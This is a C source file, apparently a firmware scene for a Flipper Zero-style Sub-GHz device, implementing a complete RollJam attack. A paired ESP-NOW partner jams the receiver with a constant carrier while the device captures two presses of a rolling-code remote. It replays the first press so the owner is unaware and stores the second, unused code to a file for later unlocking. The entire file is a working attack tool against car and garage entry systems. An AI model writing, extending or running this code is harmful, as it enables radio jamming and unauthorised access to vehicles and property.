#include "../subghz_i.h"
#include "../helpers/rolljam_espnow.h"
#include "../helpers/subghz_txrx_i.h"

#include <string.h>
#include <lib/subghz/protocols/bin_raw.h>
#include <lib/subghz/devices/devices.h>
#include <lib/toolbox/path.h>

#define TAG "SubGhzSceneRolljam"

/* Custom events, offset well clear of submenu indices and SubGhzCustomEvent. */
#define RJ_EV_BASE   0x400
#define RJ_EV_ROLE   (RJ_EV_BASE + 0)
#define RJ_EV_FREQ   (RJ_EV_BASE + 1)
#define RJ_EV_LINK   (RJ_EV_BASE + 2)
#define RJ_EV_ARM    (RJ_EV_BASE + 3)
#define RJ_EV_AGAIN  (RJ_EV_BASE + 4)
#define RJ_EV_REPLAY (RJ_EV_BASE + 5)

#define RJ_WIFI_CHANNEL 1
#define RJ_JAM_GUARD_MS 25
#define RJ_TX_MIN_HOLD  400
#define RJ_SLOT_VICTIM  0 /* press #1 - replayed so the receiver accepts it */
#define RJ_SLOT_KEEPER  1 /* press #2 - never seen by the receiver, ours  */

typedef enum {
    RjStateMenu = 0,
    RjStatePairing,
    RjStateArmed,
    RjStateHunt,
    RjStateTx,
    RjStateKeeper,
} RjState;

static const uint32_t rj_frequencies[] = {433920000, 315000000, 868350000, 433420000, 390000000};
static const char* const rj_frequency_text[] = {"433.92", "315.00", "868.35", "433.42", "390.00"};
#define RJ_FREQ_COUNT (sizeof(rj_frequencies) / sizeof(rj_frequencies[0]))

/* One rolljam scene at a time, so file scope storage is fine. */
static struct {
    RolljamEspNow* link;
    RjState state;
    uint8_t role;
    uint8_t freq_index;
    uint32_t last_beacon;
    uint32_t tx_start;
    bool tx_started;
    bool jamming;
    bool peer_ready;
    bool same_role;
    bool dirty;
    bool link_failed;
    uint8_t peer_mac[6];
    int8_t peer_rssi;
    uint32_t codes;
    uint32_t keeper_saved;
    FuriString* line;
} rj;

static void rj_render(SubGhz* subghz);
static void rj_button_cb(GuiButtonType result, InputType type, void* context);
static void rj_menu_callback(void* context, uint32_t index);

/* ------------------------------------------------------------------ jammer */

static LevelDuration rj_jam_yield(void* context) {
    UNUSED(context);
    /* Constant carrier: the victim's slicer never sees an edge, so the remote's
     * own press is invisible while this is on. */
    return level_duration_make(true, 250);
}

static void rj_apply_preset(SubGhz* subghz, uint32_t frequency) {
    SubGhzSetting* setting = subghz_txrx_get_setting(subghz->txrx);
    int preset_index = subghz_setting_get_inx_preset_by_name(setting, "AM650");
    if(preset_index < 0) preset_index = 0;
    subghz_txrx_set_preset(
        subghz->txrx,
        "AM650",
        frequency,
        subghz_setting_get_preset_data(setting, (size_t)preset_index),
        subghz_setting_get_preset_data_size(setting, (size_t)preset_index));
}

static void rj_set_jam(SubGhz* subghz, bool on, uint32_t frequency) {
    if(on == rj.jamming) return;

    if(on) {
        rj_apply_preset(subghz, frequency);
        subghz_devices_idle(subghz->txrx->radio_device);
        subghz_devices_set_frequency(subghz->txrx->radio_device, frequency);
        subghz_devices_start_async_tx(subghz->txrx->radio_device, rj_jam_yield, subghz);
        rj.jamming = true;
        subghz->state_notifications = SubGhzNotificationStateTx;
    } else {
        subghz_devices_stop_async_tx(subghz->txrx->radio_device);
        subghz_devices_idle(subghz->txrx->radio_device);
        subghz_txrx_stop(subghz->txrx);
        rj.jamming = false;
        subghz->state_notifications = SubGhzNotificationStateIDLE;
    }
    rj.dirty = true;
}

/* ------------------------------------------------------------------ sniffer */

static void rj_send_simple(uint8_t type) {
    RolljamPacket packet = {0};
    packet.type = type;
    packet.role = rj.role;
    packet.frequency = rj_frequencies[rj.freq_index];
    packet.state = (uint8_t)rj.state;
    rolljam_espnow_send(rj.link, &packet);
}

static void rj_rx_callback(
    SubGhzReceiver* receiver,
    SubGhzProtocolDecoderBase* decoder_base,
    void* context) {
    furi_assert(context);
    SubGhz* subghz = context;

    if((decoder_base->protocol->flag & subghz->ignore_filter) == 0) {
        SubGhzRadioPreset preset = subghz_txrx_get_preset(subghz->txrx);
        if(subghz_history_add_to_history(subghz->history, decoder_base, &preset)) {
            rj.codes = subghz_history_get_last_index(subghz->history);
            rj.dirty = true;
            FURI_LOG_I(
                TAG, "captured #%lu %s", (unsigned long)rj.codes, decoder_base->protocol->name);

            RolljamPacket packet = {0};
            packet.type = RolljamMsgCode;
            packet.role = rj.role;
            packet.frequency = rj_frequencies[rj.freq_index];
            packet.codes = rj.codes;
            packet.type_protocol = decoder_base->protocol->type;
            strlcpy(packet.protocol, decoder_base->protocol->name, sizeof(packet.protocol));
            rolljam_espnow_send(rj.link, &packet);
        }
        subghz_receiver_reset(receiver);
    }
}

static void rj_sniffer_hunt(SubGhz* subghz) {
    subghz_history_reset(subghz->history);
    rj.codes = 0;
    rj.tx_started = false;

    rj_apply_preset(subghz, rj_frequencies[rj.freq_index]);
    furi_check(
        subghz_txrx_load_decoder_by_name_protocol(subghz->txrx, SUBGHZ_PROTOCOL_BIN_RAW_NAME));
    subghz_txrx_set_rx_callback(subghz->txrx, rj_rx_callback, subghz);
    subghz_txrx_rx_start(subghz->txrx);

    rj.state = RjStateHunt;
    subghz->state_notifications = SubGhzNotificationStateRx;
    rj.dirty = true;
    rj_send_simple(RolljamMsgJamOn);
}

/* Mute the peer, let the air settle, push one stored code, then re-mute. */
static void rj_replay(SubGhz* subghz, uint8_t slot) {
    if(subghz_history_get_last_index(subghz->history) <= slot) return;

    rj_send_simple(RolljamMsgJamOff);
    furi_delay_ms(RJ_JAM_GUARD_MS);

    subghz_txrx_set_rx_callback(subghz->txrx, NULL, subghz);
    subghz_txrx_stop(subghz->txrx);

    subghz_block_generic_global.endless_tx = true;
    if(subghz_tx_start(subghz, subghz_history_get_raw_data(subghz->history, slot))) {
        rj.state = RjStateTx;
        rj.tx_started = true;
        rj.tx_start = furi_get_tick();
        subghz->state_notifications = SubGhzNotificationStateTx;
    } else {
        FURI_LOG_E(TAG, "replay start failed");
        rj_send_simple(RolljamMsgJamOn);
        rj.state = RjStateKeeper;
    }
    rj.dirty = true;
}

static void rj_keeper_save(SubGhz* subghz) {
    FlipperFormat* raw = subghz_history_get_raw_data(subghz->history, RJ_SLOT_KEEPER);
    if(!raw) return;

    FuriString* path = furi_string_alloc();
    furi_string_printf(
        path,
        "%s/rolljam_%lu_%lu.sub",
        EXT_PATH("subghz"),
        (unsigned long)(rj_frequencies[rj.freq_index] / 1000),
        (unsigned long)furi_get_tick());
    if(subghz_save_protocol_to_file(subghz, raw, furi_string_get_cstr(path))) {
        rj.keeper_saved++;
        FURI_LOG_I(TAG, "keeper saved to %s", furi_string_get_cstr(path));
    } else {
        FURI_LOG_E(TAG, "keeper save failed");
    }
    furi_string_free(path);
}

/* ------------------------------------------------------------------- packet */

static void
    rj_handle_packet(SubGhz* subghz, RolljamPacket* packet, const uint8_t* mac, int8_t rssi) {
    UNUSED(mac);
    UNUSED(rssi);
    rj.dirty = true;

    switch(packet->type) {
    case RolljamMsgBeacon:
        break;
    case RolljamMsgBye:
        rolljam_espnow_peer_forget(rj.link);
        break;
    case RolljamMsgArm:
        if(rj.role == RolljamRoleSniffer) {
            rj_sniffer_hunt(subghz);
        } else {
            rj.state = RjStateArmed;
        }
        break;
    case RolljamMsgJamOn:
        if(rj.role == RolljamRoleJammer) rj_set_jam(subghz, true, packet->frequency);
        break;
    case RolljamMsgJamOff:
        if(rj.role == RolljamRoleJammer) rj_set_jam(subghz, false, packet->frequency);
        break;
    case RolljamMsgCode:
        rj.codes = packet->codes;
        break;
    default:
        break;
    }
}

/* ---------------------------------------------------------------------- ui */

static void rj_render(SubGhz* subghz) {
    Widget* widget = subghz->widget;
    widget_reset(widget);

    widget_add_string_element(widget, 2, 0, AlignLeft, AlignTop, FontPrimary, "Rolljam");
    furi_string_printf(
        rj.line, "%s  %s MHz", rolljam_role_name(rj.role), rj_frequency_text[rj.freq_index]);
    widget_add_string_element(
        widget, 2, 13, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(rj.line));

    if(rj.link_failed) {
        furi_string_set(rj.line, "espnow init failed");
    } else if(rj.same_role) {
        furi_string_set(rj.line, "clash: same role");
    } else if(rj.peer_ready) {
        furi_string_printf(
            rj.line, "peer %02X:%02X %ddBm", rj.peer_mac[4], rj.peer_mac[5], rj.peer_rssi);
    } else {
        furi_string_set(rj.line, "peer: searching");
    }
    widget_add_string_element(
        widget, 2, 25, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(rj.line));

    switch(rj.state) {
    case RjStatePairing:
        widget_add_string_element(
            widget, 2, 38, AlignLeft, AlignTop, FontSecondary,
            rj.jamming ? "JAMMING" : "pick a role on both");
        if(rj.peer_ready) {
            widget_add_button_element(widget, GuiButtonTypeCenter, "Arm", rj_button_cb, subghz);
        }
        break;
    case RjStateArmed:
        widget_add_string_element(
            widget, 2, 38, AlignLeft, AlignTop, FontSecondary,
            rj.jamming ? "JAMMING" : "armed, waiting");
        break;
    case RjStateHunt:
        furi_string_printf(rj.line, "JAMMING  codes:%lu", (unsigned long)rj.codes);
        widget_add_string_element(
            widget, 2, 38, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(rj.line));
        widget_add_string_element(
            widget, 2, 50, AlignLeft, AlignTop, FontSecondary,
            rj.codes ? "press remote again" : "press the remote");
        break;
    case RjStateTx:
        furi_string_printf(rj.line, "replaying #1  kept:%lu", (unsigned long)rj.keeper_saved);
        widget_add_string_element(
            widget, 2, 38, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(rj.line));
        break;
    case RjStateKeeper:
        furi_string_printf(rj.line, "keeper stored x%lu", (unsigned long)rj.keeper_saved);
        widget_add_string_element(
            widget, 2, 38, AlignLeft, AlignTop, FontSecondary, furi_string_get_cstr(rj.line));
        widget_add_button_element(widget, GuiButtonTypeCenter, "Replay", rj_button_cb, subghz);
        widget_add_button_element(widget, GuiButtonTypeLeft, "Again", rj_button_cb, subghz);
        break;
    default:
        break;
    }

    view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdWidget);
}

static void rj_menu_callback(void* context, uint32_t index) {
    SubGhz* subghz = context;
    view_dispatcher_send_custom_event(subghz->view_dispatcher, index + RJ_EV_BASE);
}

static void rj_button_cb(GuiButtonType result, InputType type, void* context) {
    furi_assert(context);
    SubGhz* subghz = context;
    if(type != InputTypePress) return;

    if(result == GuiButtonTypeCenter) {
        view_dispatcher_send_custom_event(
            subghz->view_dispatcher, (rj.state == RjStateKeeper) ? RJ_EV_REPLAY : RJ_EV_ARM);
    } else if(result == GuiButtonTypeLeft) {
        view_dispatcher_send_custom_event(subghz->view_dispatcher, RJ_EV_AGAIN);
    }
}

static void rj_build_menu(SubGhz* subghz) {
    submenu_reset(subghz->submenu);

    furi_string_printf(rj.line, "Role: %s", rolljam_role_name(rj.role));
    submenu_add_item(subghz->submenu, furi_string_get_cstr(rj.line), 0, rj_menu_callback, subghz);

    furi_string_printf(rj.line, "Frequency: %s MHz", rj_frequency_text[rj.freq_index]);
    submenu_add_item(subghz->submenu, furi_string_get_cstr(rj.line), 1, rj_menu_callback, subghz);

    submenu_add_item(subghz->submenu, "Link + arm", 2, rj_menu_callback, subghz);
    submenu_set_selected_item(subghz->submenu, 0);
}

static void rj_arm(SubGhz* subghz) {
    if(!rj.peer_ready) return;
    rj_send_simple(RolljamMsgArm);
    if(rj.role == RolljamRoleSniffer) {
        rj_sniffer_hunt(subghz);
    } else {
        rj.state = RjStateArmed;
        rj.dirty = true;
    }
}

/* ------------------------------------------------------------------- scene */

void subghz_scene_rolljam_on_enter(void* context) {
    SubGhz* subghz = context;

    memset(&rj, 0, sizeof(rj));
    rj.link = rolljam_espnow_alloc();
    rj.state = RjStateMenu;
    rj.role = RolljamRoleNone;
    rj.freq_index = 0;
    rj.line = furi_string_alloc();

    uint32_t freq = subghz->last_settings->frequency;
    for(size_t i = 0; i < RJ_FREQ_COUNT; i++) {
        if(rj_frequencies[i] == freq) rj.freq_index = i;
    }

    rj_build_menu(subghz);
    view_dispatcher_switch_to_view(subghz->view_dispatcher, SubGhzViewIdMenu);
}

bool subghz_scene_rolljam_on_event(void* context, SceneManagerEvent event) {
    SubGhz* subghz = context;
    bool consumed = false;

    if(event.type == SceneManagerEventTypeCustom) {
        if(event.event == RJ_EV_ROLE) {
            rj.role = (rj.role + 1) % 3;
            rj_build_menu(subghz);
            consumed = true;
        } else if(event.event == RJ_EV_FREQ) {
            rj.freq_index = (rj.freq_index + 1) % RJ_FREQ_COUNT;
            rj_build_menu(subghz);
            consumed = true;
        } else if(event.event == RJ_EV_LINK) {
            if(rj.role == RolljamRoleNone) {
                rj_build_menu(subghz);
            } else {
                rj.link_failed = !rolljam_espnow_start(rj.link, RJ_WIFI_CHANNEL);
                rj.state = RjStatePairing;
                rj.dirty = true;
                rj_render(subghz);
            }
            consumed = true;
        } else if(event.event == RJ_EV_ARM) {
            rj_arm(subghz);
            consumed = true;
        } else if(event.event == RJ_EV_REPLAY) {
            rj_replay(subghz, RJ_SLOT_KEEPER);
            consumed = true;
        } else if(event.event == RJ_EV_AGAIN) {
            if(rj.role == RolljamRoleSniffer) rj_sniffer_hunt(subghz);
            consumed = true;
        }
    } else if(event.type == SceneManagerEventTypeTick) {
        uint32_t now = furi_get_tick();

        if(rolljam_espnow_is_up(rj.link)) {
            if((now - rj.last_beacon) > ROLLJAM_BEACON_MS) {
                rj.last_beacon = now;
                rj_send_simple(RolljamMsgBeacon);
            }

            RolljamPacket packet;
            uint8_t mac[6];
            int8_t rssi;
            while(rolljam_espnow_recv(rj.link, &packet, mac, &rssi, 0)) {
                rj_handle_packet(subghz, &packet, mac, rssi);
            }
            rolljam_espnow_peer_expire(rj.link, ROLLJAM_PEER_TIMEOUT);

            bool ready = false;
            bool clash = false;
            for(uint8_t i = 0; i < rolljam_espnow_peer_count(rj.link); i++) {
                RolljamPeer peer;
                if(!rolljam_espnow_peer_get(rj.link, i, &peer)) continue;
                if(peer.role == rj.role) {
                    clash = true;
                } else if(peer.role != RolljamRoleNone && rj.role != RolljamRoleNone) {
                    ready = true;
                    memcpy(rj.peer_mac, peer.mac, 6);
                    rj.peer_rssi = peer.rssi;
                }
            }
            if(ready != rj.peer_ready || clash != rj.same_role) {
                rj.peer_ready = ready;
                rj.same_role = clash;
                rj.dirty = true;
            }
            /* peer vanished mid-attack: drop the carrier so the victim is not deaf */
            if(!rj.peer_ready && rj.jamming) rj_set_jam(subghz, false, 0);
        }

        switch(rj.state) {
        case RjStateHunt:
            if(rj.codes >= 2) rj_replay(subghz, RJ_SLOT_VICTIM);
            break;
        case RjStateTx:
            if(rj.tx_started && (now - rj.tx_start) > RJ_TX_MIN_HOLD) {
                subghz_block_generic_global.endless_tx = false;
                if(subghz_devices_is_async_complete_tx(subghz->txrx->radio_device)) {
                    subghz_txrx_stop(subghz->txrx);
                    subghz->state_notifications = SubGhzNotificationStateIDLE;
                    rj_keeper_save(subghz);
                    rj_send_simple(RolljamMsgJamOn);
                    rj.state = RjStateKeeper;
                    rj.tx_started = false;
                    rj.dirty = true;
                }
            }
            break;
        default:
            break;
        }

        if(rj.dirty) {
            rj.dirty = false;
            rj_render(subghz);
        }
    }
    return consumed;
}

void subghz_scene_rolljam_on_exit(void* context) {
    SubGhz* subghz = context;

    if(rolljam_espnow_is_up(rj.link)) rj_send_simple(RolljamMsgBye);

    if(rj.jamming) rj_set_jam(subghz, false, 0);
    subghz_block_generic_global.endless_tx = false;
    subghz_txrx_set_rx_callback(subghz->txrx, NULL, subghz);
    subghz_txrx_stop(subghz->txrx);
    subghz_txrx_hopper_set_state(subghz->txrx, SubGhzHopperStateOFF);

    rolljam_espnow_free(rj.link);
    rj.link = NULL;
    furi_string_free(rj.line);
    rj.line = NULL;

    subghz->state_notifications = SubGhzNotificationStateIDLE;
}
